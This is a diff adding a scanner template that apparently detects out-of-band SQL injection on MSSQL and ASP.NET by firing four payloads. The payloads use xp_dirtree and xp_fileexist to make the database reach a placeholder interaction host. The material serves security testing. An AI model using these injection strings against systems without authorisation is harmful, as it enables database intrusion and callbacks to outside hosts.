@@ -1,0 +1,34 @@
+id: "sqli-oob-mssql"
+issue_code: sql_injection
+detection_condition: or
+detection_methods:
+  - oob_interaction:
+      oob_address: "{{.oob_address}}"
+      confidence: 95
+  - response_check:
+      check: database_error
+      confidence: 85
+vars:
+  - name: oob_address
+    value: "{{interactionAddress}}"
+launch:
+  operator: or
+  conditions:
+    - type: platform
+      value: mssql
+    - type: platform
+      value: aspnet
+    - type: scan_mode
+      value: fuzz
+templates:
+  - "'; EXEC master..xp_dirtree '//{{.oob_address}}/a'--"
+  - "1'; EXEC master..xp_dirtree '//{{.oob_address}}/a'--"
+  - "'); EXEC master..xp_dirtree '//{{.oob_address}}/a'--"
+  - "'; EXEC master..xp_fileexist '\\\\{{.oob_address}}\\a'--"
+categories:
+  - sql_injection
+  - oob
+  - mssql
+platforms:
+  - mssql
+  - aspnet
